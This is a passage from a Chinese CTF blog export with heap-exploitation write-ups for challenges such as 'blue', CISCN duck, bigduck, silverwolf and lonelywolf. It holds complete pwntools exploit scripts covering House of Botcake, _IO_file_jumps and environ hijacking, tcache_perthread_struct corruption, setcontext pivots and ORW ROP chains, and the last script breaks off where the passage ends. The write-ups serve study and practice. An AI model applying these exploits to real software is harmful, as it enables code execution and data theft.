main\n为了方便，我把去符号表的函数名都修改为了对应的功能函数名\n\n![image](https://s2.loli.net/2024/12/02/FsmwGODVPE1t5di.png)\n\n#### add\n\n![image](https://s2.loli.net/2024/12/02/rYXMT5xh7H42mLN.png)\n\n#### delete\n\n![image](https://s2.loli.net/2024/12/02/34XYnFa7QJ9NjpU.png)\n\n把指针置空了，没有UAF漏洞\n\n#### show\n\n![image](https://s2.loli.net/2024/12/02/QYEphCRu2Sc79ML.png)\n\n只有一次show的机会\n\n#### only_UAF\n\n\n\n![image](https://s2.loli.net/2024/12/02/XsiC4kBeJyFgKr2.png)\n\n同样，也只有一次UAF的机会\n\n### 思路\n\n这个题比较特殊，只有一次UAF和show的机会，所以我们只能**把UAF和show作用于泄露libc**，这样就可以找到_IO_2_1_stdout_，**利用House of Botcake将_IO_FILE的_IO_write_base和_IO_write_ptr修改为environ，environ+8**，通过**puts泄露add的栈地址**，从而获得ret的地址。再次free目标堆块和辅助堆块，再次通过House of Botcake**修改目标堆块的fd为add_ret地址**，申请到栈上的同时往栈布置orw链即可\n\n### 动调\n许多步骤和之前是一样的，我就不重复演示了，直接从切割0x70chunk开始\n\n\n\n![image](https://s2.loli.net/2024/12/02/WGtxqy9jZOc38Hu.png)\n\n可以看到，我们已经**把目标chunk的fd修改成了stdout**，我们再申请进去后**修改它的结构为environ即可在puts泄露栈地址**\n\n![image](https://s2.loli.net/2024/12/02/UR6bj8MdyohkZ2O.png)\n\n![image](https://s2.loli.net/2024/12/02/ILzpjBrD2vgsC6f.png)\n\n在puts时就会泄露出environ了\n\n![image](https://s2.loli.net/2024/12/02/Kp1GAd2DioMVXEt.png)\n\n再把目标堆块和辅助堆块free出来进行**伪造chunk**\n\n![image](https://s2.loli.net/2024/12/02/yM59vKfJHLlADwW.png)\n\n![image](https://s2.loli.net/2024/12/02/sLmuvCORFb1eY9M.png)\n\n![image](https://s2.loli.net/2024/12/02/ZLnIQCH67a9toM2.png)\n\n\n\n![image](https://s2.loli.net/2024/12/02/cfmaijwQTeP1Z65.png)\n\n到这就结束啦！\n# Payload\n```Python\nfrom pwn import *\ncontext(arch='amd64', os='linux', log_level='debug')\ncontext.terminal = ['tmux', 'splitw', '-h']\n\np = process('./blue')\n#p = remote('node4.anna.nssctf.cn',28301)\nelf = ELF('./blue')\nlibc = ELF('./libc.so.6')\n\ndef add(size, content):\n    p.recvuntil('Choice: ')\n    p.sendline(b'1')\n    p.recvuntil(b'size: ')\n    p.sendline(str(size))\n    p.recvuntil(b'content: ')\n    p.send(content)\n\ndef only_UAF(index):\n    p.recvuntil('Choice: ')\n    p.sendline(b'666')\n    p.recvuntil(b'idx: ')\n    p.sendline(str(index))\n\ndef delete(index):\n    p.recvuntil('Choice: ')\n    p.sendline(b'2')\n    p.recvuntil(b'idx: ')\n    p.sendline(str(index))\n\ndef show(index):\n    p.recvuntil('Choice: ')\n    p.sendline(b'3')\n    p.recvuntil(b'idx: ')\n    p.sendline(str(index))\n\n#house of botcake\n#leak_libc\nfor i in range(9):\n    add(0x80, b'a') #0-8\nadd(0x80,b'a') #9 to avoid being caught by top chunk\nfor i in range(7):\n    delete(i) #0-6\n#gdb.attach(p)\nonly_UAF(8) #this is victim chunk\nshow(8)\nmain_arena = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00')) - 0x60\nlog.success('main_arena==>' + hex(main_arena))\nmalloc_hook = main_arena - 0x10\nlog.success('malloc_hook==>' + hex(malloc_hook))\nlibc_base = malloc_hook - libc.symbols['__malloc_hook']\nlog.success('libc_base==>' + hex(libc_base))\n\nIO_stdout = libc_base + libc.symbols['_IO_2_1_stdout_']\nlog.success('IO_stdout==>' + hex(IO_stdout))\nenviron = libc_base + libc.symbols['environ']\nlog.success('environ==>' + hex(environ))\n\n#gdb.attach(p)\n#leak stack and fake stack chunk\ndelete(7) #this is prev chunk,which is used to be added with chunk 8,becoming a larger chunk that can be double free\nadd(0x80,b'a') #0,leave a place to target chunk,index 8\ndelete(8) #this time,the 8th chunk has been double free,which is in the list of tcache,and it will be used to overwrite the fd of 8th chunk by overlapping\ngdb.attach(p)\nadd(0x70,b'a') #1\nadd(0x70,p64(0) + p64(0x91) + p64(IO_stdout)) #2,chunk expend,change fd to IO_stdout\nadd(0x80,b'a') #3,which fd has been changed to IO_stdout,\n# gdb.attach(p)\nadd(0x80,p64(0xfbad1800) + p64(0)*3 + p64(environ) + p64(environ + 8)) #4,edit IO_stdout to leak stack\nstack = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))\nlog.success('stack==>' + hex(stack))\nstack_base = stack - 0x158\nlog.success('stack_base==>' + hex(stack_base))\nadd_ret = stack_base + 0x30\nlog.success('add_ret==>' + hex(add_ret))\ndelete(3) #free victim chunk\ndelete(2) #free the chunk that can change fd of victim chunk\nadd(0x70,p64(0) + p64(0x91) + p64(add_ret)) #2,fake stack chunk\n\n#set orw\nopen_addr = libc_base + libc.symbols['open']\nread_addr = libc_base + libc.symbols['read']\nputs_addr = libc_base + libc.symbols['puts']\npop_rdi = libc_base + 0x23b6a\npop_rsi = libc_base + 0x2601f\npop_rdx = libc_base + 0x142c92\norw = b'/flag\\x00\\x00\\x00' + p64(pop_rdi) + p64(add_ret) + p64(pop_rsi) + p64(0) + p64(open_addr)\norw += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(stack + 0x200) + p64(pop_rdx) + p64(0x100) + p64(read_addr)\norw += p64(pop_rdi) + p64(stack + 0x200) + p64(puts_addr)\n\n#getshell\nadd(0x80,b'a') #3\n#gdb.attach(p)\nadd(0x80,orw) #4,the stack\n\np.interactive()\n```\n# 总结\n这个玩意感觉挺考验细心程度和对堆的理解，一个不留神就会弄错索引，伪造失败。堆好多house啊——**什么时候才有我的house——**\n","tags":["Pwn","Heap"],"categories":["网络安全"]},{"title":"劫持_IO_file_jumps&environ","url":"/2024/05/11/劫持_IO_file_jumps攻击和environ攻击/","content":"\n\n\n# 导言\n\n哎，异或fd指针真是令人讨厌\n\n# IO_file_jumps\n_IO_lock_t _IO_stdfile，_IO_wide_data（针对宽字节的虚函数表），```_IO_FILE_plus（含有stdin,stdout）```三者均被定义为IO_file_jumps\n## 原理\nIO_file_jumps是一个全局变量符号，存有以下符号\n\n\n![image](https://s2.loli.net/2024/12/02/DZAxWiFV95CnJ3r.png)\n\n这个结构体主要跟缓冲区有关，比如调用**puts**,fread,fgets,```exit（这个会触发_IO_flush_all_lockp）```之类的函数时，会根据_IO_FILE结构体调用对应的函数，常常会用到_IO_file_jumps\n我们根据情况，**将对应的函数指针修改为system('/bin/sh')**，岂不是getshell？\n\n## 例题：[CISCN 2022 华东北]duck\n### checksec\n\n\n![image](https://s2.loli.net/2024/12/02/UH9JSMOIX2vmK6G.png)\n\n### 源审\n主函数是经典的菜单选择\n\n\n![image](https://s2.loli.net/2024/12/02/qvb9trH3lkaxseO.png)\n\n### add\n\n\n![image](https://s2.loli.net/2024/12/02/x4vjtFZgPlBECVy.png)\n\n### delete\n\n\n![image](https://s2.loli.net/2024/12/02/otT5sF6AcLjhz8Y.png)\n\n### show\n\n\n![image](https://s2.loli.net/2024/12/02/VnfJcDbhWr95pyg.png)\n\n### edit\n\n\n![image](https://s2.loli.net/2024/12/02/YG1EWrxSePJm2Na.png)\n\n总结就是经典的UAF漏洞，不存在sandbox，但**由于是GLIBC2.34高版本**，**hook函数基本都被扬了**，没法像之前那样攻击了，因为有**puts函数会调用IO_file_jumps**，所以我们将目标定为IO_file_jumps进行伪造\n\n### Payload实现\n#### leak_libc_and_heap\n```Python\nfrom pwn import *\ncontext(arch='amd64', os='linux', log_level='debug')\ncontext.terminal = ['tmux', 'splitw', '-h']\n\np = process('./duck')\n#p = remote('node4.anna.nssctf.cn',28015)\nelf = ELF('./duck')\nlibc = ELF('./libc.so.6')\n\ndef add():\n    p.recvuntil(b'Choice: ')\n    p.sendline(b'1')\n\ndef delete(index):\n    p.recvuntil(b'Choice: ')\n    p.sendline(b'2')\n    p.recvuntil(b'Idx: ')\n    p.sendline(str(index))\n\ndef show(index):\n    p.recvuntil(b'Choice: ')\n    p.sendline(b'3')\n    p.recvuntil(b'Idx: \\n')\n    p.sendline(str(index))\n\ndef edit(index,content):\n    p.recvuntil(b'Choice: ')\n    p.sendline(b'4')\n    p.recvuntil(b'Idx: ')\n    p.sendline(str(index))\n    p.recvuntil(b'Size: ')\n    p.sendline(str(len(content)))\n    p.recvuntil(b'Content: ')\n    p.send(content)\n#leak libc\nfor i in range(8): #0-7\n    add()\nadd() #8\nfor i in range(8):\n    delete(i)\nshow(7)\nmain_arena = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00')) - 0x60\nlog.success('main_arena==>'+hex(main_arena))\nlibc_base = main_arena - 0x1f2c60\nlog.success('libc_base==>'+hex(libc_base))\nIO_file_jumps = libc_base + libc.sym['_IO_file_jumps']\nlog.success('IO_file_jumps==>'+hex(IO_file_jumps))\none_gadget = libc_base + 0xda864\n#leak heap_base\nshow(0)\nheap_base = u64(p.recv(5).ljust(8,b'\\x00')) << 12\nlog.success('heap_base==>'+hex(heap_base))\n```\n最开始的步骤都很基础，将tcache填满，再free一个进入unsorted_bin从而泄露main_arena+96，进而泄露libc_base来获取各个函数的地址。在高版本libc，**heap的fd指针会有加密，需要移位，有时还要异或**\n现在的接收都是```u64(p.recv(5).ljust(8,b'\\x00')) << 12```\n而修改heap的fd指针则是```(heap_addr >> 12)^target_addr```\n#### 伪造_IO_file_jumps结构体\n```Python\nfor i in range(5):\n    add() #9-13\nedit(1,p64((heap_base >> 12)^IO_file_jumps) + p64(0))\n```\n因为之前free了七个chunk，为了不破坏bins的结构，先取出五个chunk,然后再进行修改\nadd前\n\n\n![image](https://s2.loli.net/2024/12/02/HBnxjsraNtIzYKG.png)\n\nadd时\n\n\n![image](https://s2.loli.net/2024/12/02/uNHWYf7tSBLMaJZ.png)\n\nedit后\n\n\n![image](https://s2.loli.net/2024/12/02/BqFxnyEUklbTfc4.png)\n\n所以我们再申请两个出来后就成功伪造了_IO_file_jumps的chunk，我们就可以对它进行修改了\n\n#### 修改_IO_file_jumps结构体\n```Python\nadd()\nadd()\nedit(15,p64(0) * 3 + p64(one_gadget))\n```\n我们首先看看修改前结构体的内容\n\n\n![image](https://s2.loli.net/2024/12/02/8sjYNlxAKFXRvi5.png)\n\n可以看到，跟我们原理里介绍的一样，那么我们将它edit后呢？\n\n\n![image](https://s2.loli.net/2024/12/02/aZubpKDmUYAecL9.png)\n\n可以看到，__overflow被覆盖为了onegadget的地址，原本调用puts的流程是```puts->_IO_putc->_IO_overflow```，这下_IO_overflow变成了onegadget，意味着**执行puts的时候就getshell了**\n\n\n![image](https://s2.loli.net/2024/12/02/xWja4TNEqQUblws.png)\n\n\n\n![image](https://s2.loli.net/2024/12/02/8zZeV7QlItokSmN.png)\n\n\n\n![image](https://s2.loli.net/2024/12/02/k3bcuhHYsoWT1R9.png)\n\n\n\n![image](https://s2.loli.net/2024/12/02/gts9cLkBdxGafuw.png)\n\n这就是完整的劫持流程啦，执行这个后就getshell了\n\n### 完整Payload\n```Python\nfrom pwn import *\ncontext(arch='amd64', os='linux', log_level='debug')\ncontext.terminal = ['tmux', 'splitw', '-h']\n\np = process('./duck')\n#p = remote('node4.anna.nssctf.cn',28015)\nelf = ELF('./duck')\nlibc = ELF('./libc.so.6')\n\ndef add():\n    p.recvuntil(b'Choice: ')\n    p.sendline(b'1')\n\ndef delete(index):\n    p.recvuntil(b'Choice: ')\n    p.sendline(b'2')\n    p.recvuntil(b'Idx: ')\n    p.sendline(str(index))\n\ndef show(index):\n    p.recvuntil(b'Choice: ')\n    p.sendline(b'3')\n    p.recvuntil(b'Idx: \\n')\n    p.sendline(str(index))\n\ndef edit(index,content):\n    p.recvuntil(b'Choice: ')\n    p.sendline(b'4')\n    p.recvuntil(b'Idx: ')\n    p.sendline(str(index))\n    p.recvuntil(b'Size: ')\n    p.sendline(str(len(content)))\n    p.recvuntil(b'Content: ')\n    p.send(content)\n\nfor i in range(8):\n    add()\n#gdb.attach(p)\nadd()\nfor i in range(8):\n    delete(i)\n#gdb.attach(p)\nshow(7)\nmain_arena = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00')) - 0x60\nlog.success('main_arena==>'+hex(main_arena))\nlibc_base = main_arena - 0x1f2c60\nlog.success('libc_base==>'+hex(libc_base))\nIO_file_jumps = libc_base + libc.sym['_IO_file_jumps']\nlog.success('IO_file_jumps==>'+hex(IO_file_jumps))\none_gadget = libc_base + 0xda864\n\nshow(0)\nheap_base = u64(p.recv(5).ljust(8,b'\\x00')) << 12\nlog.success('heap_base==>'+hex(heap_base))\n\n#gdb.attach(p)\nfor i in range(5):\n    add()\n#gdb.attach(p)\nedit(1,p64((heap_base >> 12)^IO_file_jumps) + p64(0))\nadd()\n#gdb.attach(p)\nadd()\ngdb.attach(p)\nedit(15,p64(0) * 3 + p64(one_gadget))\n\np.interactive()\n```\n\n# environ\n## 原理\nenviron，顾名思义，就是**环境变量**，一般来说就是以下这些玩意等等\n\n![image](https://s2.loli.net/2024/12/02/5Nuoc1yxLHMa6ep.png)\n\n![image](https://s2.loli.net/2024/12/02/bA2m3eWUtIc1qQj.png)\n\n我们可以**通过environ泄露出栈地址**，根据相对偏移**计算出当前栈的地址的ret**，如果能修改ret，我们就有很多操作空间\n\n## 例题：[CISCN 2022 华东北]bigduck\n### 保护检查\nchecksec和源审和上题的duck是一样的，只不过版本不一样，这题的**版本是libc-2.33**，此时的hook函数还没被扬，但是本题**开了sanbox**，只能用orw\n\n\n![image](https://s2.loli.net/2024/12/02/dEtKTa7gQ2Mh5B1.png)\n\n### Payload实现\n#### leak_libc_and_heap\n```Python\nfrom pwn import *\ncontext(arch='amd64', os='linux', log_level='debug')\ncontext.terminal = ['tmux', 'splitw', '-h']\n\np = process('./bigduck')\n#p = remote('node4.anna.nssctf.cn', 28603)\nelf = ELF('./bigduck')\nlibc = ELF('./libc.so.6')\n\ndef add():\n    p.recvuntil(b'Choice: ')\n    p.sendline(b'1')\n\ndef delete(index):\n    p.recvuntil(b'Choice: ')\n    p.sendline(b'2')\n    p.recvuntil(b'Idx: ')\n    p.sendline(str(index))\n\ndef show(index):\n    p.recvuntil(b'Choice: ')\n    p.sendline(b'3')\n    p.recvuntil(b'Idx: \\n')\n    p.sendline(str(index))\n\ndef edit(index,content):\n    p.recvuntil(b'Choice: ')\n    p.sendline(b'4')\n    p.recvuntil(b'Idx: ')\n    p.sendline(str(index))\n    p.recvuntil(b'Size: ')\n    p.sendline(str(len(content)))\n    p.recvuntil(b'Content: ')\n    p.send(content)\n\nfor i in range(8):\n    add()\nadd()\nfor i in range(8):\n    delete(i)\nedit(7, b'a') #重点，不然有\\x00截断无法输出main_arena\nshow(7)\nmain_arena = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00')) - 0x60 - 0x61\nlog.success('main_arena==>'+hex(main_arena))\nmalloc_hook = main_arena - 0x10\nlog.success('malloc_hook==>'+hex(malloc_hook))\n\nlibc_base = malloc_hook - libc.sym['__malloc_hook']\nlog.success('libc_base==>'+hex(libc_base))\nenviron = libc_base + libc.sym['_environ']\nlog.success('environ==>'+hex(environ))\n\nshow(0)\nheap_base = u64(p.recv(5).ljust(8,b'\\x00')) << 12\nlog.success('heap_base==>'+hex(heap_base))\n```\n跟上题一样的步骤\n#### 泄露stack\n```Python\nstack_ptr = (heap_base >> 12) ^ environ\nlog.success('stack_ptr==>'+hex(stack_ptr))\ngdb.attach(p)\nedit(6,p64(stack_ptr))\nadd()\nadd()\nshow(10)\nstack = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))\nlog.success('stack==>'+hex(stack))\nstack_base = stack - 0x138\nlog.success('stack_base==>'+hex(stack_base))\n```\ncan can edit之后\n\n\n![image](https://s2.loli.net/2024/12/02/EJzpZr2d5gX9wWO.png)\n\n跟原理上展示一样，再**add两次伪造environ成chunk后即可puts出栈地址**，从而计算出当前函数（edit）的ret地址，再进行修改\n\n\n![image](https://s2.loli.net/2024/12/02/Xoh51M8qpTYfBNz.png)\n\n![image](https://s2.loli.net/2024/12/02/7NJKTYzh3a5byFf.png)\n\n![image](https://s2.loli.net/2024/12/02/Rw3BUSuz6vcxfNM.png)\n\n对比一下就发现没有错，在后续中修改edit_ret即可\n\n#### orw\n```Python\npop_rdi = libc_base + 0x28a55\npop_rsi = libc_base + 0x2a4cf\npop_rdx = libc_base + 0xc7f32\npop_ret = libc_base + 0x26699\nopen_addr = libc_base + libc.sym['open']\nread_addr = libc_base + libc.sym['read']\nputs_addr = libc_base + libc.sym['puts']\nflag_addr = heap_base + 0x5d0\n\nedit(3,b'/flag\\x00')\n\norw = p64(0) * 3 + p64(pop_ret) + p64(pop_rdi) + p64(flag_addr) +p64(pop_rsi) + p64(0) + p64(open_addr)\norw += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(heap_base + 0x300) + p64(pop_rdx) + p64(0x100) + p64(read_addr)\norw += p64(pop_rdi) + p64(heap_base + 0x300) + p64(puts_addr)\n\ndelete(8)\ndelete(9)\nedit(9, p64((heap_base >> 12)^stack_base))\nadd()\nadd()\nedit(12,orw)\np.interactive()\n```\n在对应的heap地址上edit出flag，记住该地址赋给rdi，实现open的打开，后续的都是基础的操作，因为**高版本setcontext函数有所改变**，笔者尚不熟悉，所以没有用，而是用这种普通的orw。\n照旧先free两个进行链子改造\n\n![image](https://s2.loli.net/2024/12/02/WeiFrCbIL7qhXsk.png)\n\nadd两个后申请到了栈上，可以修改栈内容，由于rsp距rbp有0x10个字节，因此覆盖0x18后链上orw即可\n\n\n![image](https://s2.loli.net/2024/12/02/qAK76YzscbCtrLT.png)\n\n\n\n![image](https://s2.loli.net/2024/12/02/8oIW5LfM6KrUAB2.png)\n\n基本就跟getshell了差不多。不过这里用不了write函数，会通不过某个检测\n\n# 总结\n我的脑袋——\n我好想你——\n我快困死了——","tags":["Pwn","Heap"],"categories":["网络安全"]},{"title":"劫持tcache_perthread_struct","url":"/2024/04/27/劫持tcache_perthread_struct(Ubuntu22.04之前)/","content":"\n\n\n# 前言（可忽略）\n\n堆不愧是堆...知识点真的要多用动调查看堆的状态才好理解\n\n# tcache_perthread_struct的结构\n## 源码\n```C\n#define TCACHE_MAX_BINS 64\n/* We overlay this structure on the user-data portion of a chunk when\n   the chunk is stored in the per-thread cache.  */\ntypedef struct tcache_entry\n{\n  struct tcache_entry *next;\n} tcache_entry;\n\n/* There is one of these for each thread, which contains the\n   per-thread cache (hence \"tcache_perthread_struct\").  Keeping\n   overall size low is mildly important.  Note that COUNTS and ENTRIES\n   are redundant (we could have just counted the linked list each\n   time), this is for performance reasons.  */\ntypedef struct tcache_perthread_struct\n{\n  char counts[TCACHE_MAX_BINS];\n  tcache_entry *entries[TCACHE_MAX_BINS];\n} tcache_perthread_struct;\n```\n我们可以看到，该结构体有两个数组，一个是**counts**，另一个是**entry**\n## counts数组\ncounts的数组记录的是**tcache上各个bin上的堆个数**，如下图\n![image](https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240426223034808-716180166.png)\n这是bins的情况\n![image](https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240426223647653-450186157.png)\n这是heap_base的情况，也就是我们的tcache_perthread_struct的状况，被红框框起来的地方就是counts记录个数的区域\n这是我们的攻击点之一\n![image](https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240426223203715-439199098.png)\n这是struct里的counts个数，可以看到个数是对应的\n## entry指针数组\n如题，entry储存的是**各个指针**，存储的是**各个bin链表上的首chunk的fd指针**\n而entry就储存在counts之下，这也是我们的另一个攻击点\n## 大小\n一般而言是0x250或者0x290，依旧前0x10是chunk头，记录该结构体的大小\n## 攻击方法\n通过TAF泄露出**heap_base**的地址，heap_base所在的区域就是tcache_perthread_struct，但我们不能修改它的chunk头，否则会破坏结构体。我们攻击的地方是从heap_base + 0x10的地方，这个地方就是我们的data域，首先**伪造counts**，然后就是**修改entry为我们的恶意ROP链**。常见的攻击方式有**setcontext+orw(结不结合SROP因题而异),劫持free_hook**\n\n# 例题①[CISCN 2021 初赛]silverwolf（setcontext+orw）\n## checksec\n![image](https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427094156647-363504993.png)\n只能说堆题是这样的\n## 源审\n### main\n![image](https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427094510551-425507554.png)\n很经典的菜单\n其中sub_C70是初始化和sandbox，仅允许使用orw\n### add\n![image](https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427094627784-1904648021.png)\nadd的重点就是这几个，**index只能为0，size不超过0x78，buf会指向v2**\n### edit\n![image](https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427095153958-1413715253.png)\n索引依然是0，v0会指向buf，也就是我们最近申请的malloc，意味着**我们能够修改的堆块只能是我们最近申请的堆块**。后面还藏着个off-by-one漏洞，但是不重要，把以往的send变成sendline就好\n### show\n![image](https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427095407635-250612587.png)\n标准的show函数，输出索引为0的堆块内容\n### delete\n![image](https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427095559425-1362029456.png)\nfree索引为0的堆块，没有置空指针，明显的UAF漏洞\n### 总结\n因为索引只能为0，意味着我们只能对最近申请的堆块进行操作，大大限制了我们利用UAF的能力，没法用double free，但是我们仍可以malloc到一个我们想要的地址，只需要修改堆块里的fd指针即可，结合sandbox里只允许我们用orw，那么很明显就是通过劫持tcache_perthread_struct来布置恶意ROP链\n\n## 动调过程\n我先把各个功能的函数定义出来\n```Python\ndef add(size):\n    p.sendlineafter('Your choice: ',str(1))\n    p.sendlineafter('Index:',str(0))\n    p.sendlineafter('Size:',str(size))\n\ndef edit(content):\n    p.sendlineafter('Your choice: ',str(2))\n    p.sendlineafter('Index:',str(0))\n    p.sendlineafter('Content:',content)\n\ndef show():\n    p.sendlineafter('Your choice: ',str(3))\n    p.sendlineafter('Index:',str(0))\n\ndef delete():\n    p.sendlineafter('Your choice: ',str(4))\n    p.sendlineafter('Index:',str(0))\n```\n### 泄露heap_base\n先看看初始bins的情况\n![image](https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427100150305-1222889883.png)\n因为sandbox的存在，初始就会有一些堆块生成\n接下来就是老一套了，UAF泄露出heap_base，都看到这了应该就不用多解释是怎么泄露出来的吧（）\n```Python\n#gdb.attach(p)\nadd(0x78)\ndelete()\nshow()\n\np.recvuntil('Content: ')\nheap_addr = u64(p.recv(6).ljust(8,b'\\x00'))\nlog.success('heap_addr==>'+hex(heap_addr))\nheap_base = heap_addr - 0x11b0\nlog.success('heap_base==>'+hex(heap_base))\n```\n### 泄露libc_base\n```Python\nedit(p64(heap_base + 0x10))\nadd(0x78)\nadd(0x78)\n#gdb.attach(p)\nfor i in range(7):\n    #sleep(0.5)\n    delete()\n    edit(p64(0) * 2) #清除fd和bk指针，使其能够持续free下去\ndelete()\nshow()\nmain_arena = u64(p.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00')) - 96 #free tcache_perthread_struct into unsorted bins\nlog.success('main_arena==>'+hex(main_arena))\nmalloc_hook = main_arena - 0x10\nlog.success('malloc_hook==>'+hex(malloc_hook))\nlibc_base = malloc_hook - libc.symbols['__malloc_hook']\nlog.success('libc_base==>'+hex(libc_base))\nedit(b'\\x00' * 0x78) #恢复结构体\n```\n在当初free的基础上，将其fd指针修改为```heap_base+0x10```，两次add劫持到tcache_perthread_struct里，看看动调过程\nedit之前\n![image](https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427101023276-762138581.png)\nedit之后\n![image](https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427101049531-529781327.png)\n可以看出来已经将其fd指向了tcache_perthread_struct，进行两次malloc即可劫持到里边\n此时我们就可以泄露栈地址了，通过**修改fd和bk指针欺骗系统让其可以持续free**，待其填满0x250所在的bins链表后就可以进入unsorted_bin里**泄露main_arena**，进而泄露malloc_hook和libc_base\n![image](https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427101927044-850379117.png)\n![image](https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427101945768-1436361933.png)\nOK现在泄露完两个基质之后就可以构造了\n### tcache_bins构造恶意地址\n#### 该阶段Payload\n```Python\nrax = libc_base + 0x43ae8\nrbp = libc_base + 0x21353\nrdi = libc_base + 0x215bf\nrdx = libc_base + 0x1b96\nrsi = libc_base + 0x23eea\nrsp = libc_base + 0x3960\nfree_hook = libc_base + libc.symbols['__free_hook']\nread = libc_base + libc.symbols['read']\nwrite = libc_base + libc.symbols['write']\n#syscall = read + 0xf\nsyscall = libc_base + 0xe5965 #注意，只能是syscall;ret，可以在IDA中使用sequence of bytes寻找，编码为 0xf 0x05 0xc3\nmov_rsp_rdi_a0 = libc_base + libc.sym['setcontext'] + 53\nflag_addr = heap_base + 0x1000\nret = libc_base + 0x8aa\norw1 = heap_base + 0x3000\norw2 = heap_base + 0x3060\nfake_orw1 = heap_base + 0x2000\nfake_orw2 = heap_base + 0x20a0\n\npayload = b'\\x00' * 0x40 #repair the counts,which is 64 byteds\npayload += p64(free_hook) + p64(0) #0x20 0x30\npayload += p64(flag_addr) + p64(fake_orw1) #0x40 0x50\npayload += p64(fake_orw2) + p64(orw1) #0x60 0x70\npayload += p64(orw2) #0x80\n#gdb.attach(p)\nedit(payload)\n```\n在布置恶意地址之前我们先来介绍一个函数```setcontext```，是我们劫持tcache_perthread_struct的时候相当常用的函数\n#### setcontext\n看看它的源码\n![image](https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427104507741-953595500.png)\n框起来的地方就是我们主要利用的地方,**free是rdi寻址，而我们刚好可以利用rdi**\nsetcontext函数就是通过rdi给各个寄存器赋值，但对我们来说只有rsp最重要，当然仅仅有rsp并不够，还要有rip，好在最后有ret指令，可以把执行地址迁移到我们的恶意ROP链上\n所以我们通常使用的是setcontext+53，另一个原因是**不想引用fldenv指令**，防止造成**程序崩溃**\n\n#### 动调\nOK现在该回到动调过程了\n**先修改counts数组，尔后修改entry为我们布置的地址**\n![image](https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427110149708-436005707.png)\n由于我们**没有办法直接修改链表的内容**所以我们需要在两个orw地址上再伪造两个地址，一个用来引用free，另一个用来跳转到orw上，我会一一给出解释\n```\n\t0x20 free_hook-->setcontext\n\t0x40 存储flag\n\t0x50 调用free\n\t0x60 跳转至orw\n\t0x70 orw的前半部分（因为size只有0x60）\n\t0x80 orw的后半部分\n```\n### ORW链+getshell\n```Python\nshellcode = p64(rdi) + p64(flag_addr) + p64(rsi) + p64(0) + p64(rax) + p64(2) + p64(syscall)\nshellcode += p64(rdi) + p64(3) + p64(rsi) + p64(orw1) + p64(rdx) + p64(0x100) + p64(read)\nshellcode += p64(rdi) + p64(1) + p64(write)\n\n#gdb.attach(p)\nadd(0x18) #free_hook\nedit(p64(mov_rsp_rdi_a0))\nadd(0x38) #edit flag\nedit(b'/flag\\x00')\nadd(0x68) #orw1\nedit(shellcode[:0x60]) #the place near the beginning orw\nadd(0x78) #orw2\nedit(shellcode[0x60:]) #the place near the end orw\nadd(0x58) #fake2\nedit(p64(orw1) + p64(ret))\n#gdb.attach(p)\nadd(0x48) #fake1\n#gdb.attach(p)\ndelete()\n\np.interactive()\n```\n来让我们跟着动调一步一步看效果\n![image](https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427111123839-2019308764.png)\nfree的时候会调用```setcontext+0x53```，原理和__malloc_hook是差不多的，我们再跟进\n![image](https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427111228035-1803931608.png)\n第一步会把我们**储存在rdi + 0xa0的地址处的值取出来赋给rsp**，也**就会把我们的rsp迁到我们布置好的恶意ROP链上**\n![image](https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427111327154-1705991264.png)\n继续跟进可以看到我们就开始执行ROP链了\n![image](https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427111439915-1477585456.png)\n到这就结束啦，就可以获得flag了\n\n# 例题②[CISCN 2021 初赛]lonelywolf（劫持free_hook）\n这个题跟silverwolf其实区别不大，就是没有开sandbox让我们有这种常规方式进行攻击\n## checksec\n![image](https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240429211226346-42078125.png)\n## 源审\n它原本还开了去符号表，我这边把它修改成了对应函数\n![image](https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240429211245943-1568004840.png)\n### add\n![image](https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240429211328962-903329788.png)\n### show\n![image](https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240429211348558-1988703103.png)\n### edit\n![image](https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240429211407039-1374223032.png)\n### delete\n![image](https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240429211421920-1113325612.png)\n可以看到，这些函数和silverwolf是没有区别的，仅仅只是攻击方式的区别\n## Payload\n```Python\nfrom pwn import *\nfrom LibcSearcher3 import *\ncontext(arch='amd64', os='linux', log_level='debug')\ncontext.terminal = ['tmux', 'splitw', '-h']\n\np = process('./lonelywolf')\n#p = remote('node4.anna.nssctf.cn',28775)\n\ndef add(size):\n    p.sendlineafter('Your choice: ',str(1))\n    p.sendlineafter('Index:',str(0))\n    p.sendlineafter('Size:',str(size))\n\ndef edit(content):\n    p.sendlineafter('Your choice: ',str(2))\n    p.sendlineafter('Index:',str(0))\n    p.sendlineafter('Content:',content)\n\ndef show():\n    p.sendlineafter('Your choice: ',str(3))\n    p.sendlineafter('Index:',str(0))\n\ndef delete():\n    p.sendlineafter('Your choice: ',str(4))\n    